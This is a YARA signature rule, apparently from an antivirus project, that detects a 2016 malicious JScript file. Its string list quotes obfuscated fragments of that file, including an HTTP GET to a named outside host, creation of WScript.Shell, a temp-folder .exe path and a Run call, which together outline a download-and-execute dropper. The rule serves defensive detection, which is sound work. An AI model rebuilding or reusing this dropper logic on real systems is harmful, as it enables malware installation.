rule sig_20160401_7f41cdbcae3b2d995a6407ea17a57bf4 {
  meta:
    description = "datamaliciousorder - file 20160401_7f41cdbcae3b2d995a6407ea17a57bf4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "add970315e20b7ed0e8e5f3852691a833da647c8b5d592b55e36d5da1dfd6c27"

  strings:
    $s1  = "GrqAu[FueUu](\"G\" + \"ET\", \"http://sirplusalot.net/l1pasw\", false);" fullword ascii
    $s2  = "var RxqZd = function MfwPuc() {return WScript[DtzBhf](\"WScript\"+\".Shell\");}(), FaaTi = 11;" fullword ascii
    $s3  = "function JprNp(EwvArz, LehJv){TiCpk = TiCpk * 1; return EwvArz - LehJv;};" fullword ascii
    $s4  = "if (GrqAu[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MjPo() {return RxqZd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"I6tfbDN4p.ex\" + \"e\";};" fullword ascii
    $s6  = "function OoaCq(){return YuGq + \"\";};" fullword ascii
    $s7  = "function GukHnf() {return ((PjkArg == true) && (PjkArg == PjQt)) ? 1 : TiCpk;};" fullword ascii
    $s8  = "var EdYbo = new this[\"Date\"]();" fullword ascii
    $s9  = "function QjmFpg(){return DtzBhf;};" fullword ascii
    $s10 = "var PjQt = false;" fullword ascii
    $s11 = "return JprNp(WdhKde, UvLx);" fullword ascii
    $s12 = "var XzyXvv = false;" fullword ascii
    $s13 = "var PjkArg = false;" fullword ascii
    $s14 = "function JztGh(){return 23;};" fullword ascii
    $s15 = "function XjAjt()" fullword ascii
    $s16 = "PjkArg = true; " fullword ascii
    $s17 = "PjQt = true; " fullword ascii
    $s18 = "function AflRdj(MxOm){RxqZd[\"R\"+\"un\"](MxOm, TiCpk, TiCpk);};" fullword ascii
    $s19 = "}while (FucYu);" fullword ascii
    $s20 = "function HzuAy(PvjWp) {var XnOs = (1, 2, 3, 4, 5, PvjWp); return XnOs;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}